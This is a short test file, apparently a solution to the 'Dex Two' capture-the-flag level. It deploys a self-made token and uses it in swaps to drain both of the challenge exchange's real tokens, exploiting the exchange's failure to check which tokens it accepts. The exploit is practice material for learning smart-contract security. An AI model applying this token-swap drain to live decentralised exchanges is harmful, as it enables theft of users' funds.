import { expectLevelSolved } from "../utils";
import { deploymentConfirmation, txConfirmation } from "./utils";

describe("Dex Two Solution", function () {
  it("Should solve the level", expectLevelSolved({
    deployId: "23", 
    solutionFn: async ({ challenge, accounts: [ eoa ] }) => {
      const exploit = await deploymentConfirmation("DexTwoSolution", "DexTwoSolution", "DTE", 4);
      await txConfirmation(exploit.approve(challenge.address, 3));
      await txConfirmation(exploit.transfer(challenge.address, 1));
      await txConfirmation(challenge.swap(exploit.address, await challenge.token1(), 1))
      await txConfirmation(challenge.swap(exploit.address, await challenge.token2(), 2))
    }
  }));
});
